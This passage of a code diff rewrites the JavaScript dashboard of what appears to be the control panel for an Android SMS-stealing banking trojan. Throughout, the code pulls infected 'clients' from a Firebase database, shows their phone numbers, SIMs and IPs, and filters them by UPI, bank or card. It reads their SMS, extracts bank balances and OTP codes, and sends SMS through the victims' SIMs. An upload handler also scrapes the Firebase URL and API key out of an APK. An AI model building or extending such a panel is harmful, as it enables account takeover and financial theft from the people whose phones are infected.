+      el.className = 'toast ' + type + ' show';
+      clearTimeout(el._hide);
+      el._hide = setTimeout(() => el.classList.remove('show'), 3000);
+    }
 
-        // ─── PARSE DEVICES ────────────────────────────────────────────────
-        function parseDevices(data) {
-            if (!data || typeof data !== 'object') return [];
-            return Object.keys(data).map(id => {
-                const d = data[id];
-                return {
-                    id,
-                    name: d.name || d.deviceName || id,
-                    phone: d.mobNo || d.phone || '',
-                    battery: d.batteryNum || d.battery || 0,
-                    status: d.status === true || d.online === true,
-                    note: d.note || d.notes || '',
-                    sims: d.sims || [],
-                    batteryRaw: d.batteryRaw || null,
-                    android: d.android || '',
-                    ip: d.ip || '',
-                    joined: d.joined || '',
-                    network: d.network || d.carrier || '',
-                    storage: d.storage || '',
-                    cpuArch: d.cpuArch || d.cpu || '',
-                    sdkVersion: d.sdkVersion || '',
-                    favorite: d.favorite || false,
-                    upi: d.upi || false,
-                    bank: d.bank || false,
-                    card: d.card || false,
-                    ...d
-                };
-            });
-        }
+    // ─── NAV ────────────────────────────────────────────────────────────
+    function showHome() { homeScreen.classList.remove('hidden'); dashboardScreen.style.display = 'none'; renderConnections(); }
+    function showDashboard() { homeScreen.classList.add('hidden'); dashboardScreen.style.display = 'block'; refreshDevices(); startPolling(); }
 
-        // ─── REFRESH DEVICES ──────────────────────────────────────────────
-        async function refreshDevices() {
-            if (!activeConn) return;
-            try {
-                const data = await fbGet('clients');
-                allDevices = parseDevices(data);
-                // Load messages for each device (bank count)
-                await loadAllMessages();
-                renderDeviceGrid();
-                updateStats();
-            } catch (e) {
-                toast('Failed to fetch devices: ' + e.message, 'error');
-            }
-        }
+    // ─── CONNECTIONS ──────────────────────────────────────────────────
+    function renderConnections() {
+      if (!connectionsList) return;
+      if (CONNECTIONS.length === 0) { connectionsList.innerHTML = `<div style="color:var(--muted);padding:12px;text-align:center">No accounts saved.</div>`; connCount.textContent = '0'; return; }
+      connCount.textContent = CONNECTIONS.length;
+      connectionsList.innerHTML = CONNECTIONS.map((c, i) => `
+        <div class="conn-item">
+          <div class="info"><div class="name">${esc(c.label)}</div><div class="date">${c.date || ''} · ${c.url ? c.url.substring(0,30)+'…' : ''}</div></div>
+          <button class="connect" data-idx="${i}" title="Connect">▶</button>
+          <button class="del" data-idx="${i}" title="Delete">✕</button>
+        </div>
+      `).join('');
+      connectionsList.querySelectorAll('.connect').forEach(btn => {
+        btn.addEventListener('click', () => { const idx = parseInt(btn.dataset.idx); const conn = CONNECTIONS[idx]; if (conn) { activeConn = conn; showDashboard(); toast('Connected to '+conn.label, 'success'); } });
+      });
+      connectionsList.querySelectorAll('.del').forEach(btn => {
+        btn.addEventListener('click', () => { const idx = parseInt(btn.dataset.idx); if (confirm('Delete "'+CONNECTIONS[idx].label+'"?')) { CONNECTIONS.splice(idx,1); localStorage.setItem('rsx_connections', JSON.stringify(CONNECTIONS)); renderConnections(); toast('Deleted', 'error'); } });
+      });
+    }
 
-        async function loadAllMessages() {
-            for (const d of allDevices) {
-                try {
-                    const data = await fbGet('messages/' + d.id);
-                    messageCache[d.id] = parseMessages(data);
-                } catch (e) {
-                    messageCache[d.id] = [];
-                }
-            }
-        }
+    // ─── FIREBASE ──────────────────────────────────────────────────────
+    function fbUrl(path) { return activeConn.url + '/' + path + '.json' + (activeConn.key ? '?auth=' + activeConn.key : ''); }
+    async function fbGet(path) { const res = await fetch(fbUrl(path)); if (!res.ok) throw new Error('HTTP '+res.status); return res.json(); }
+    async function fbSet(path, data) { const res = await fetch(fbUrl(path), { method: 'PUT', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(data) }); if (!res.ok) throw new Error('HTTP '+res.status); return res.json(); }
 
-        function parseMessages(data) {
-            if (!data || typeof data !== 'object') return [];
-            return Object.keys(data).map(key => {
-                const m = data[key];
-                return {
-                    key,
-                    message: m.message || m.text || '',
-                    sender: m.sender || '',
-                    dateTime: m.dateTime || m.timestamp || '',
-                    type: m.type || 'incoming',
-                    otp: m.otp || ''
-                };
-            }).sort((a, b) => (a.dateTime > b.dateTime ? -1 : 1));
-        }
+    // ─── PARSE ──────────────────────────────────────────────────────────
+    function parseDevices(data) {
+      if (!data || typeof data !== 'object') return [];
+      return Object.keys(data).map(id => {
+        const d = data[id];
+        // Extract phone number from multiple possible fields
+        let phone = d.mobNo || d.phone || d.phoneNumber || '';
+        // If SIMs exist, try to get from first SIM
+        if (!phone && d.sims && d.sims.length && d.sims[0].phoneNumber) phone = d.sims[0].phoneNumber;
+        return {
+          id,
+          name: d.name || d.deviceName || id,
+          phone: phone,
+          battery: d.batteryNum || d.battery || 0,
+          status: d.status === true || d.online === true,
+          note: d.note || d.notes || '',
+          sims: d.sims || [],
+          android: d.android || '',
+          ip: d.ip || '',
+          joined: d.joined || '',
+          network: d.network || d.carrier || '',
+          storage: d.storage || '',
+          cpuArch: d.cpuArch || d.cpu || '',
+          sdkVersion: d.sdkVersion || '',
+          favorite: d.favorite || false,
+          upi: d.upi || false,
+          bank: d.bank || false,
+          card: d.card || false,
+          ...d
+        };
+      });
+    }
 
-        function isBankSms(msg) {
-            const text = msg.message.toLowerCase();
-            return /balance|bank|credit|debit|ac no|account|upi|received|rs\.|₹/.test(text);
-        }
+    function parseMessages(data) {
+      if (!data || typeof data !== 'object') return [];
+      return Object.keys(data).map(key => {
+        const m = data[key];
+        return {
+          key,
+          message: m.message || m.text || '',
+          sender: m.sender || '',
+          dateTime: m.dateTime || m.timestamp || '',
+          type: m.type || 'incoming',
+          otp: m.otp || ''
+        };
+      }).sort((a,b) => (a.dateTime > b.dateTime ? -1 : 1));
+    }
 
-        function extractBalance(msg) {
-            const text = msg.message;
-            const match = text.match(/(?:balance|bal|rs\.?|₹)\s*[:.]?\s*([\d,]+\.?\d*)/i);
-            if (match) return match[1];
-            return null;
-        }
+    function isBankSms(msg) {
+      const t = msg.message.toLowerCase();
+      return /balance|bank|credit|debit|upi|received|rs\.?|₹|avail|transaction|ac\s*no|account/.test(t);
+    }
 
-        function getDeviceBankSms(deviceId) {
-            const msgs = messageCache[deviceId] || [];
-            return msgs.filter(m => isBankSms(m));
-        }
+    function extractBalance(msg) {
+      const match = msg.message.match(/(?:balance|bal|rs\.?|₹)\s*[:.]?\s*([\d,]+\.?\d*)/i);
+      return match ? match[1] : null;
+    }
 
-        function getLatestBalance(deviceId) {
-            const bankMsgs = getDeviceBankSms(deviceId);
-            if (!bankMsgs.length) return null;
-            const latest = bankMsgs[0];
-            return extractBalance(latest);
-        }
+    function getDeviceBankSms(deviceId) { return (messageCache[deviceId] || []).filter(m => isBankSms(m)); }
+    function getLatestBalance(deviceId) { const bank = getDeviceBankSms(deviceId); if(!bank.length) return null; return extractBalance(bank[0]); }
 
-        // ─── RENDER DEVICE GRID ───────────────────────────────────────────
-        function renderDeviceGrid() {
-            const q = searchQuery.toLowerCase().trim();
-            let filtered = allDevices;
-            if (filterMode === 'online') filtered = filtered.filter(d => d.status);
-            else if (filterMode === 'offline') filtered = filtered.filter(d => !d.status);
-            else if (filterMode === 'favorite') filtered = filtered.filter(d => d.favorite === true);
-            else if (filterMode === 'upi') filtered = filtered.filter(d => d.upi === true);
-            else if (filterMode === 'bank') filtered = filtered.filter(d => d.bank === true);
-            else if (filterMode === 'card') filtered = filtered.filter(d => d.card === true);
+    // ─── REFRESH ────────────────────────────────────────────────────────
+    async function refreshDevices() {
+      if (!activeConn) return;
+      try {
+        const data = await fbGet('clients');
+        allDevices = parseDevices(data);
+        await loadAllMessages();
+        renderDeviceGrid();
+        updateStats();
+      } catch(e) { toast('Failed to fetch devices: '+e.message, 'error'); }
+    }
 
-            if (q) filtered = filtered.filter(d =>
-                d.name.toLowerCase().includes(q) ||
-                d.id.toLowerCase().includes(q) ||
-                (d.phone && d.phone.includes(q))
-            );
+    async function loadAllMessages() {
+      for (const d of allDevices) {
+        try { const data = await fbGet('messages/'+d.id); messageCache[d.id] = parseMessages(data); } catch(e) { messageCache[d.id] = []; }
+      }
+    }
 
-            if (sortMode === 'newest') {
-                filtered.sort((a, b) => (a.joined > b.joined ? -1 : 1));
-            } else {
-                filtered.sort((a, b) => (a.joined > b.joined ? 1 : -1));
-            }
+    // ─── RENDER GRID ────────────────────────────────────────────────────
+    function renderDeviceGrid() {
+      const q = searchQuery.toLowerCase().trim();
+      let filtered = allDevices;
+      if (filterMode === 'online') filtered = filtered.filter(d => d.status);
+      else if (filterMode === 'offline') filtered = filtered.filter(d => !d.status);
+      else if (filterMode === 'favorite') filtered = filtered.filter(d => d.favorite);
+      else if (filterMode === 'upi') filtered = filtered.filter(d => d.upi);
+      else if (filterMode === 'bank') filtered = filtered.filter(d => d.bank);
+      else if (filterMode === 'card') filtered = filtered.filter(d => d.card);
 
-            if (filtered.length === 0) {
-                deviceGrid.innerHTML = `<div class="empty-grid">No devices found.</div>`;
-                return;
-            }
+      if (q) filtered = filtered.filter(d => d.name.toLowerCase().includes(q) || d.id.toLowerCase().includes(q) || (d.phone && d.phone.includes(q)));
 
-            deviceGrid.innerHTML = filtered.map(d => {
-                const bankMsgs = getDeviceBankSms(d.id);
-                const bankCount = bankMsgs.length;
-                const balance = getLatestBalance(d.id);
-                return `
-                        <div class="device-card" data-id="${d.id}">
-                            <div class="top">
-                                <div class="icon ${d.status ? 'online' : ''}">${d.status ? '●' : '○'}</div>
-                                <div class="info">
-                                    <div class="name">${esc(d.id)}</div>
-                                    <div class="sub">
-                                        <span>${esc(d.android || 'Android')}</span>
-                                        <span>🔋 ${d.battery || 0}%</span>
-                                        <span>${esc(d.network || '')}</span>
-                                    </div>
-                                </div>
-                            </div>
-                            ${balance ? `<div class="balance"><span class="label">Balance</span> ₹${esc(balance)}</div>` : ''}
-                            <div class="details">
-                                <div class="item"><small>Phone</small><div>${esc(d.phone || '—')}</div></div>
-                                <div class="item"><small>Battery</small><div>${d.battery || 0}%</div></div>
-                            </div>
-                            <button class="send-btn-small" data-id="${d.id}" title="Send SMS">✉</button>
-                        </div>
-                    `;
-            }).join('');
+      if (sortMode === 'newest') filtered.sort((a,b) => (a.joined > b.joined ? -1 : 1));
+      else filtered.sort((a,b) => (a.joined > b.joined ? 1 : -1));
 
-            deviceGrid.querySelectorAll('.device-card').forEach(card => {
-                card.addEventListener('click', (e) => {
-                    if (e.target.closest('.send-btn-small')) return;
-                    const id = card.dataset.id;
-                    const dev = allDevices.find(d => d.id === id);
-                    if (dev) openDetail(dev);
-                });
-            });
-            deviceGrid.querySelectorAll('.send-btn-small').forEach(btn => {
-                btn.addEventListener('click', (e) => {
-                    e.stopPropagation();
-                    const id = btn.dataset.id;
-                    const dev = allDevices.find(d => d.id === id);
-                    if (dev) openDetail(dev);
-                });
-            });
-        }
+      if (!filtered.length) { deviceGrid.innerHTML = '<div class="empty-grid">No devices found.</div>'; return; }
 
-        // ─── UPDATE STATS ──────────────────────────────────────────────────
-        function updateStats() {
-            const total = allDevices.length;
-            const online = allDevices.filter(d => d.status).length;
-            const offline = total - online;
-            let bankTotal = 0;
-            for (const id of Object.keys(messageCache)) {
-                bankTotal += getDeviceBankSms(id).length;
-            }
-            totalStat.textContent = total;
-            onlineStat.textContent = online;
-            offlineStat.textContent = offline;
-            bankStat.textContent = bankTotal;
-        }
+      deviceGrid.innerHTML = filtered.map(d => {
+        const balance = getLatestBalance(d.id);
+        const statusText = d.status ? 'Online' : 'Offline';
+        const statusClass = d.status ? 'online' : '';
+        return `
+          <div class="device-card" data-id="${d.id}">
+            <div class="top">
+              <div class="icon ${statusClass}">${d.status ? '●' : '○'}</div>
+              <div class="info">
+                <div class="name">${esc(d.id)}</div>
+                <div class="sub">
+                  <span>${esc(d.android || 'Android')}</span>
+                  <span>🔋 ${d.battery || 0}%</span>
+                  <span>${esc(d.network || '')}</span>
+                </div>
+              </div>
+            </div>
+            ${balance ? `<div class="balance"><span class="label">Balance</span> ₹${esc(balance)}</div>` : ''}
+            <div class="details">
+              <div class="item"><small>Phone</small><div>${esc(d.phone || '—')}</div></div>
+              <div class="item"><small>Status</small><div>${statusText}</div></div>
+            </div>
+            <button class="send-btn-small" data-id="${d.id}" title="Send SMS">✉</button>
+          </div>
+        `;
+      }).join('');
 
-        // ─── DETAIL MODAL ──────────────────────────────────────────────────
-        async function openDetail(device) {
-            selectedDevice = device;
-            $('detailDeviceName').textContent = device.id;
-            $('detailStatus').textContent = device.status ? '● Online' : '○ Offline';
-            $('detailStatus').style.color = device.status ? 'var(--green)' : 'var(--muted)';
-            $('detailBattery').textContent = device.battery || 0;
-            const bankMsgs = getDeviceBankSms(device.id);
-            $('detailBankCount').textContent = bankMsgs.length;
-            const allMsgs = messageCache[device.id] || [];
-            $('detailSmsCount').textContent = allMsgs.length;
+      deviceGrid.querySelectorAll('.device-card').forEach(card => {
+        card.addEventListener('click', (e) => { if(e.target.closest('.send-btn-small')) return; const id = card.dataset.id; const dev = allDevices.find(d => d.id === id); if(dev) openDetail(dev); });
+      });
+      deviceGrid.querySelectorAll('.send-btn-small').forEach(btn => {
+        btn.addEventListener('click', (e) => { e.stopPropagation(); const id = btn.dataset.id; const dev = allDevices.find(d => d.id === id); if(dev) openDetail(dev); });
+      });
+    }
 
-            // Info grid — exactly as screenshot
-            detailGrid.innerHTML = `
-                    <div class="detail-item"><div class="label">Phone Number</div><div class="value">${esc(device.phone || '—')}</div></div>
-                    <div class="detail-item"><div class="label">Network</div><div class="value">${esc(device.network || '—')}</div></div>
-                    <div class="detail-item"><div class="label">Android</div><div class="value">${esc(device.android || '—')}</div></div>
-                    <div class="detail-item"><div class="label">IP Address</div><div class="value">${esc(device.ip || '—')}</div></div>
-                    <div class="detail-item"><div class="label">Storage</div><div class="value">${esc(device.storage || '—')}</div></div>
-                    <div class="detail-item"><div class="label">CPU Arch</div><div class="value">${esc(device.cpuArch || '—')}</div></div>
-                    <div class="detail-item"><div class="label">SDK Version</div><div class="value">${esc(device.sdkVersion || '—')}</div></div>
-                    <div class="detail-item"><div class="label">SIM Cards</div><div class="value">${device.sims ? device.sims.length + ' SIM(s)' : '0 SIM(s)'}</div></div>
-                    <div class="detail-item" style="grid-column:1/-1"><div class="label">From SMS</div>
-                        <div class="value">
-                            ${device.sims && device.sims.length ? device.sims.map((s, i) => `
-                                <div style="font-size:13px;margin:2px 0">Phone #${i+1}: ${esc(s.phoneNumber || '')}</div>
-                                <div style="font-size:13px;margin:2px 0">Network #${i+1}: ${esc(s.network || '')}</div>
-                            `).join('') : '—'}
-                        </div>
-                    </div>
-                `;
+    function updateStats() {
+      const total = allDevices.length;
+      const online = allDevices.filter(d => d.status).length;
+      const offline = total - online;
+      let bankTotal = 0;
+      for (const id of Object.keys(messageCache)) bankTotal += getDeviceBankSms(id).length;
+      totalStat.textContent = total;
+      onlineStat.textContent = online;
+      offlineStat.textContent = offline;
+      bankStat.textContent = bankTotal;
+    }
 
-            // SMS list
-            renderSmsList(device.id);
+    // ─── DETAIL MODAL ──────────────────────────────────────────────────
+    async function openDetail(device) {
+      selectedDevice = device;
+      $('detailDeviceName').textContent = device.id;
+      $('detailStatus').textContent = device.status ? '● Online' : '○ Offline';
+      $('detailStatus').style.color = device.status ? 'var(--green)' : 'var(--muted)';
+      $('detailBattery').textContent = device.battery || 0;
+      const bankMsgs = getDeviceBankSms(device.id);
+      $('detailBankCount').textContent = bankMsgs.length;
+      const allMsgs = messageCache[device.id] || [];
+      $('detailSmsCount').textContent = allMsgs.length;
 
-            // Prefill SMS number
-            smsTo.value = device.phone || '';
-            smsBody.value = '';
-            sendResult.className = 'send-result';
-            sendResult.textContent = '';
+      detailGrid.innerHTML = `
+        <div class="detail-item"><div class="label">Phone Number</div><div class="value">${esc(device.phone || '—')}</div></div>
+        <div class="detail-item"><div class="label">Network</div><div class="value">${esc(device.network || '—')}</div></div>
+        <div class="detail-item"><div class="label">Android</div><div class="value">${esc(device.android || '—')}</div></div>
+        <div class="detail-item"><div class="label">IP Address</div><div class="value">${esc(device.ip || '—')}</div></div>
+        <div class="detail-item"><div class="label">Storage</div><div class="value">${esc(device.storage || '—')}</div></div>
+        <div class="detail-item"><div class="label">CPU Arch</div><div class="value">${esc(device.cpuArch || '—')}</div></div>
+        <div class="detail-item"><div class="label">SDK Version</div><div class="value">${esc(device.sdkVersion || '—')}</div></div>
+        <div class="detail-item"><div class="label">SIM Cards</div><div class="value">${device.sims ? device.sims.length + ' SIM(s)' : '0 SIM(s)'}</div></div>
+        <div class="detail-item" style="grid-column:1/-1"><div class="label">From SMS</div>
+          <div class="value">${device.sims && device.sims.length ? device.sims.map((s,i) => `
+            <div style="font-size:13px;margin:2px 0">Phone #${i+1}: ${esc(s.phoneNumber || '')}</div>
+            <div style="font-size:13px;margin:2px 0">Network #${i+1}: ${esc(s.network || '')}</div>
+          `).join('') : '—'}</div>
+        </div>
+      `;
 
-            // Update send button text with SIM
-            updateSendBtnText();
+      // Bank SMS
+      renderBankSms(device.id);
+      // Regular SMS
+      renderSmsList(device.id);
 
-            detailModal.classList.add('active');
-        }
+      smsTo.value = device.phone || '';
+      smsBody.value = '';
+      sendResult.className = 'send-result';
+      sendResult.textContent = '';
+      updateSendBtnText();
+      detailModal.classList.add('active');
+    }
 
-        function updateSendBtnText() {
-            sendSmsBtn.textContent = '📤 Send via SIM ' + simChoice;
-        }
+    function renderBankSms(deviceId) {
+      const allMsgs = messageCache[deviceId] || [];
+      const bankMsgs = allMsgs.filter(m => isBankSms(m));
+      const totalSms = allMsgs.length;
 
-        function renderSmsList(deviceId, search = '') {
-            const msgs = messageCache[deviceId] || [];
-            const filtered = search ? msgs.filter(m =>
-                m.message.toLowerCase().includes(search.toLowerCase()) ||
-                (m.sender && m.sender.toLowerCase().includes(search.toLowerCase()))
-            ) : msgs;
-            $('smsCountLabel').textContent = `(${filtered.length})`;
-            if (!filtered.length) {
-                messageList.innerHTML = '<div style="color:var(--muted);padding:12px">No messages.</div>';
-                return;
-            }
-            messageList.innerHTML = filtered.slice(0, 100).map(m => {
-                const otpMatch = m.message.match(/\b(\d{4,8})\b/);
-                const otp = otpMatch ? otpMatch[1] : '';
-                return `
-                        <div class="sms-item">
-                            <div class="sms-header">
-                                <span>${esc(m.sender || 'Unknown')}</span>
-                                <span>${esc(m.dateTime || '')}</span>
-                            </div>
-                            <div class="sms-body">${esc(m.message)}</div>
-                            ${otp ? `<div class="sms-otp">🔐 OTP: ${otp}</div>` : ''}
-                            ${isBankSms(m) ? `<div style="color:var(--gold);font-size:12px;margin-top:4px">🏦 Bank SMS</div>` : ''}
-                        </div>
-                    `;
-            }).join('');
-        }
+      if (!bankMsgs.length) {
+        bankSmsSection.style.display = 'none';
+        return;
+      }
 
-        // ─── SEND SMS ──────────────────────────────────────────────────────
-        async function sendSms() {
-            if (!selectedDevice) {
-                toast('No device selected', 'error');
-                return;
-            }
-            const to = smsTo.value.trim();
-            const body = smsBody.value.trim();
-            if (!to || !body) {
-                toast('Enter number and message', 'error');
-                return;
-            }
-            sendSmsBtn.disabled = true;
-            sendResult.className = 'send-result';
-            sendResult.textContent = 'Sending…';
+      bankSmsSection.style.display = 'block';
+      bankHeader.innerHTML = `Auto-detected from <span id="bankTotalSms">${totalSms}</span> SMS`;
+      bankCountLabel.textContent = `${bankMsgs.length} bank message(s) found`;
 
-            try {
-                const payload = {
-                    sim: simChoice,
-                    to: to,
-                    message: body,
-                    sent: true,
-                    timestamp: new Date().toISOString()
-                };
-                const path = 'messages/' + selectedDevice.id + '/outgoing_' + Date.now();
-                await fbSet(path, payload);
-                sendResult.className = 'send-result ok';
-                sendResult.textContent = '✅ Sent successfully';
-                toast('SMS sent', 'success');
-                // Refresh messages
-                await loadMessages(selectedDevice.id);
-                renderSmsList(selectedDevice.id, smsSearch.value);
-            } catch (e) {
-                sendResult.className = 'send-result err';
-                sendResult.textContent = '❌ Error: ' + e.message;
-                toast('Send failed', 'error');
-            } finally {
-                sendSmsBtn.disabled = false;
-                updateSendBtnText();
-            }
-        }
+      bankSmsList.innerHTML = bankMsgs.map(m => {
+        const balance = extractBalance(m);
+        const disputeMatch = m.message.match(/(https?:\/\/[^\s]+)/);
+        const refMatch = m.message.match(/([+-]\d+\.?\d*)/);
+        const ref = refMatch ? refMatch[1] : '';
+        const acMatch = m.message.match(/[A-Z]{2,}\s*(\d{4,6})/);
+        const ac = acMatch ? '••'+acMatch[1] : '••••';
 
-        async function loadMessages(deviceId) {
-            try {
-                const data = await fbGet('messages/' + deviceId);
-                messageCache[deviceId] = parseMessages(data);
-            } catch (e) {
-                messageCache[deviceId] = [];
-            }
-        }
+        let bankName = m.sender || 'Bank';
+        if (m.message.includes('UCO')) bankName = 'UCONBK';
+        else if (m.message.includes('HDFC')) bankName = 'HDFC';
+        else if (m.message.includes('SBI')) bankName = 'SBI';
+        else if (m.message.includes('ICICI')) bankName = 'ICICI';
+        else if (m.message.includes('Axis')) bankName = 'AXIS';
+        else if (m.message.includes('PNB')) bankName = 'PNB';
 
-        // ─── POLLING ────────────────────────────────────────────────────────
-        function startPolling() {
-            if (pollTimer) clearInterval(pollTimer);
-            pollTimer = setInterval(() => {
-                if (activeConn) refreshDevices();
-            }, 3000);
-        }
+        return `
+          <div class="bank-card">
+            <div class="bank-top">
+              <span class="bank-name">${esc(bankName)}</span>
+              <span class="bank-sender">${esc(m.sender || '')}</span>
+              <span class="bank-ac">${esc(ac)}</span>
+            </div>
+            ${balance ? `<div class="bank-balance">AVAILABLE BALANCE ₹${esc(balance)}${ref ? ` <span class="ref">${esc(ref)}</span>` : ''}</div>` : ''}
+            <div class="bank-txn">${esc(m.message)}${disputeMatch ? ` <span class="dispute" onclick="window.open('${esc(disputeMatch[1])}','_blank')">Report Dispute</span>` : ''}</div>
+            <div class="bank-date">${esc(m.dateTime || '')}</div>
+          </div>
+        `;
+      }).join('');
+    }
 
-        function stopPolling() {
-            if (pollTimer) clearInterval(pollTimer);
-            pollTimer = null;
-        }
+    function renderSmsList(deviceId, search = '') {
+      const msgs = messageCache[deviceId] || [];
+      const filtered = search ? msgs.filter(m => m.message.toLowerCase().includes(search.toLowerCase()) || (m.sender && m.sender.toLowerCase().includes(search.toLowerCase()))) : msgs;
+      $('smsCountLabel').textContent = `(${filtered.length})`;
+      if (!filtered.length) { messageList.innerHTML = '<div style="color:var(--muted);padding:12px">No messages.</div>'; return; }
+      messageList.innerHTML = filtered.map(m => {
+        const otpMatch = m.message.match(/\b(\d{4,8})\b/);
+        const otp = otpMatch ? otpMatch[1] : '';
+        return `
+          <div class="sms-item">
+            <div class="sms-header"><span>${esc(m.sender || 'Unknown')}</span><span>${esc(m.dateTime || '')}</span></div>
+            <div class="sms-body">${esc(m.message)}</div>
+            ${otp ? `<div class="sms-otp">🔐 OTP: ${otp}</div>` : ''}
+            ${isBankSms(m) ? `<div style="color:var(--gold);font-size:12px;margin-top:4px">🏦 Bank SMS</div>` : ''}
+          </div>
+        `;
+      }).join('');
+    }
 
-        // ─── HELPERS ──────────────────────────────────────────────────────
-        function esc(str) {
-            if (!str) return '';
-            const div = document.createElement('div');
-            div.textContent = str;
-            return div.innerHTML;
-        }
+    function updateSendBtnText() { sendSmsBtn.textContent = '📤 Send via SIM ' + simChoice; }
 
-        // ─── EVENT BINDING ──────────────────────────────────────────────────
-        $('newConnBtn').addEventListener('click', () => {
-            accLabel.value = '';
-            accUrl.value = '';
-            accKey.value = '';
-            setupError.classList.add('hidden');
-            newAccountModal.classList.add('active');
-        });
-        closeAccount.addEventListener('click', () => newAccountModal.classList.remove('active'));
-        cancelAccountBtn.addEventListener('click', () => newAccountModal.classList.remove('active'));
-        newAccountModal.addEventListener('click', (e) => {
-            if (e.target === newAccountModal) newAccountModal.classList.remove('active');
-        });
+    // ─── SEND SMS ──────────────────────────────────────────────────────
+    async function sendSms() {
+      if (!selectedDevice) { toast('No device selected', 'error'); return; }
+      const to = smsTo.value.trim();
+      const body = smsBody.value.trim();
+      if (!to || !body) { toast('Enter number and message', 'error'); return; }
+      sendSmsBtn.disabled = true;
+      sendResult.className = 'send-result';
+      sendResult.textContent = 'Sending…';
+      try {
+        const payload = { sim: simChoice, to, message: body, sent: true, timestamp: new Date().toISOString() };
+        await fbSet('messages/'+selectedDevice.id+'/outgoing_'+Date.now(), payload);
+        sendResult.className = 'send-result ok';
+        sendResult.textContent = '✅ Sent successfully';
+        toast('SMS sent', 'success');
+        await loadMessages(selectedDevice.id);
+        renderBankSms(selectedDevice.id);
+        renderSmsList(selectedDevice.id, smsSearch.value);
+      } catch(e) {
+        sendResult.className = 'send-result err';
+        sendResult.textContent = '❌ Error: '+e.message;
+        toast('Send failed', 'error');
+      } finally { sendSmsBtn.disabled = false; updateSendBtnText(); }
+    }
 
-        apkFileInput.addEventListener('change', (e) => {
-            const file = e.target.files[0];
-            if (!file) return;
-            const reader = new FileReader();
-            reader.onload = (ev) => {
-                const content = ev.target.result;
-                const urlMatch = content.match(/(https?:\/\/[^\s]+\.firebaseio\.com)/);
-                const keyMatch = content.match(/AIza[0-9A-Za-z_-]{35}/);
-                if (urlMatch) accUrl.value = urlMatch[1];
-                if (keyMatch) accKey.value = keyMatch[0];
-                toast('Extracted from file', 'success');
-            };
-            reader.readAsText(file);
-        });
+    async function loadMessages(deviceId) {
+      try { const data = await fbGet('messages/'+deviceId); messageCache[deviceId] = parseMessages(data); } catch(e) { messageCache[deviceId] = []; }
+    }
 
-        saveAccountBtn.addEventListener('click', () => {
-            const label = accLabel.value.trim() || 'RS Project';
-            const url = accUrl.value.trim();
-            const key = accKey.value.trim();
-            if (!url) {
-                setupError.textContent = 'Firebase URL is required';
-                setupError.classList.remove('hidden');
-                return;
-            }
-            setupError.classList.add('hidden');
-            const conn = {
-                label,
-                url,
-                key,
-                date: new Date().toLocaleString()
-            };
-            CONNECTIONS.push(conn);
-            localStorage.setItem('rsx_connections', JSON.stringify(CONNECTIONS));
-            activeConn = conn;
-            newAccountModal.classList.remove('active');
-            showDashboard();
-            toast('Connected to ' + label, 'success');
-        });
+    // ─── POLLING ────────────────────────────────────────────────────────
+    function startPolling() { if (pollTimer) clearInterval(pollTimer); pollTimer = setInterval(() => { if (activeConn) refreshDevices(); }, 3000); }
+    function stopPolling() { if (pollTimer) clearInterval(pollTimer); pollTimer = null; }
 
-        searchInput.addEventListener('input', () => {
-            searchQuery = searchInput.value;
-            renderDeviceGrid();
-        });
+    // ─── HELPERS ──────────────────────────────────────────────────────
+    function esc(str) { if (!str) return ''; const div = document.createElement('div'); div.textContent = str; return div.innerHTML; }
 
-        document.querySelectorAll('.filter').forEach(btn => {
-            btn.addEventListener('click', () => {
-                document.querySelectorAll('.filter').forEach(b => b.classList.remove('active'));
-                btn.classList.add('active');
-                filterMode = btn.dataset.filter;
-                renderDeviceGrid();
-            });
-        });
+    // ─── EVENTS ────────────────────────────────────────────────────────
+    $('newConnBtn').addEventListener('click', () => { accLabel.value = ''; accUrl.value = ''; accKey.value = ''; setupError.classList.add('hidden'); newAccountModal.classList.add('active'); });
+    closeAccount.addEventListener('click', () => newAccountModal.classList.remove('active'));
+    cancelAccountBtn.addEventListener('click', () => newAccountModal.classList.remove('active'));
+    newAccountModal.addEventListener('click', (e) => { if (e.target === newAccountModal) newAccountModal.classList.remove('active'); });
 
-        let sortToggle = false;
-        $('sortBtn').addEventListener('click', () => {
-            sortToggle = !sortToggle;
-            sortMode = sortToggle ? 'oldest' : 'newest';
-            $('sortBtn').textContent = 'Sort: ' + (sortToggle ? 'Oldest' : 'Newest');
-            renderDeviceGrid();
-        });
+    apkFileInput.addEventListener('change', (e) => {
+      const file = e.target.files[0];
+      if (!file) return;
+      const reader = new FileReader();
+      reader.onload = (ev) => {
+        const content = ev.target.result;
+        const urlMatch = content.match(/(https?:\/\/[^\s]+\.firebaseio\.com)/);
+        const keyMatch = content.match(/AIza[0-9A-Za-z_-]{35}/);
+        if (urlMatch) accUrl.value = urlMatch[1];
+        if (keyMatch) accKey.value = keyMatch[0];
+        toast('Extracted from file', 'success');
+      };
+      reader.readAsText(file);
+    });
 
-        $('logoutBtn').addEventListener('click', () => {
-            stopPolling();
-            activeConn = null;
-            allDevices = [];
-            dashboardScreen.style.display = 'none';
-            showHome();
-            toast('Disconnected');
-        });
+    saveAccountBtn.addEventListener('click', () => {
+      const label = accLabel.value.trim() || 'RS Project';
+      const url = accUrl.value.trim();
+      const key = accKey.value.trim();
+      if (!url) { setupError.textContent = 'Firebase URL is required'; setupError.classList.remove('hidden'); return; }
+      setupError.classList.add('hidden');
+      const conn = { label, url, key, date: new Date().toLocaleString() };
+      CONNECTIONS.push(conn);
+      localStorage.setItem('rsx_connections', JSON.stringify(CONNECTIONS));
+      activeConn = conn;
+      newAccountModal.classList.remove('active');
+      showDashboard();
+      toast('Connected to '+label, 'success');
+    });
 
-        $('refreshBtn').addEventListener('click', refreshDevices);
+    searchInput.addEventListener('input', () => { searchQuery = searchInput.value; renderDeviceGrid(); });
 
-        closeDetail.addEventListener('click', () => detailModal.classList.remove('active'));
-        detailModal.addEventListener('click', (e) => {
-            if (e.target === detailModal) detailModal.classList.remove('active');
-        });
+    document.querySelectorAll('.filter').forEach(btn => {
+      btn.addEventListener('click', () => {
+        document.querySelectorAll('.filter').forEach(b => b.classList.remove('active'));
+        btn.classList.add('active');
+        filterMode = btn.dataset.filter;
+        renderDeviceGrid();
+      });
+    });
 
-        smsSearch.addEventListener('input', () => {
-            if (selectedDevice) renderSmsList(selectedDevice.id, smsSearch.value);
-        });
+    let sortToggle = false;
+    $('sortBtn').addEventListener('click', () => { sortToggle = !sortToggle; sortMode = sortToggle ? 'oldest' : 'newest'; $('sortBtn').textContent = 'Sort: ' + (sortToggle ? 'Oldest' : 'Newest'); renderDeviceGrid(); });
 
-        $('refreshSmsBtn').addEventListener('click', async () => {
